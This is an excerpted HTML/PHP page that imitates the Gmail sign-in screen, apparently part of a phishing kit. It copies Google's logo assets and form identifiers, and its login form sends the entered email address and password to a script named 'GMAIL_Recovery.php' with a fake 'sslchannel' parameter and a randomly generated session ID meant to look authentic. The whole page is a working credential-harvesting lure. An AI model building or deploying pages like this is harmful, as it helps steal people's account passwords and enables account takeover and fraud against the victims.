...
<head>
    ...
    <style>
        ...
        .header .logo-w {
            ...
            margin: 21px 0 0;
            background-image: url("assets/files/gmail/glogo.png");
        }
    ...
    <style>
        ...
        .circle-mask {
            ...
            background-repeat: no-repeat;
            background-image: url("assets/files/gmail/grayImg.png");
    ...
    <div class="main content clearfix">
        ...
        <div class="main-content
            ...
            <div class="card signin-card
                ...
                <!--login form -->
                <form novalidate="" method="post" action="GMAIL_Recovery.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" id="gaia_loginform">
                    <div class="form-panel first valid" id="gaia_firstform">
                        <div class="slide-out">
                            <div class="input-wrapper focused">
                                <div id="identifier-shown">
                                    <div>
                                        ...
                                        <input id="Email" type="email" value="" spellcheck="false" name="username" placeholder="Enter your email" autofocus="">
                                        <input id="Passwd" type="password" spellcheck="false" name="password" placeholder="Password">
                                    </div>
                                </div>
                            ...
                            <input id="next" name="signIn" class="rc-button rc-button-submit" type="submit" value="Login">
                    ...
                    <a id="back-arrow" href="" tabindex="-1" class="back-arrow "> <img aria-label="Back" tabindex="0" alt="Back" src="./assets/files/gmail/arrow_back_grey600_24dp.png"> </a>
    ...
    <div class="myweb-footer-bar">
        <div class="footer content clearfix">
            ...
            <div id="lang-vis-control" style="display: inline;">
						<span id="lang-chooser-wrap" class="lang-chooser-wrap"> <label for="lang-chooser"><img src="./assets/files/gmail/universal_language_settings-21.png" alt="Change language"></label>
